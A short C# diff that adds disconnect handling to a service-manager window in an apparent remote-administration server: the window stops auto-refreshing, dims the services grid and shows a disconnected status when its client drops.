@@ -80,6 +80,7 @@ public partial class ServiceManagerWindow : ThemedWindow
     private ICollectionView? _view;
     private readonly DispatcherTimer _autoRefresh;
     private int _countdown = 30;
+    private bool _disconnected;
 
     public ServiceManagerWindow(TlsServer server, string clientId, string label)
     {
@@ -160,11 +161,18 @@ public partial class ServiceManagerWindow : ThemedWindow
     private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
     {
         if (c.Id != _clientId) return;
-        Dispatcher.BeginInvoke(() => _autoRefresh.Stop());
+        Dispatcher.BeginInvoke(() =>
+        {
+            _disconnected = true;
+            _autoRefresh.Stop();
+            GridServices.Opacity = 0.55;
+            TxtStatus.Text = Lang.Get("PM_DISCONNECTED");
+        });
     }
 
     private void Refresh()
     {
+        if (_disconnected) return;
         _countdown = 30;
         TxtStatus.Text = Lang.Get("STATUS_REFRESHING");
         _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.SvcGetList });
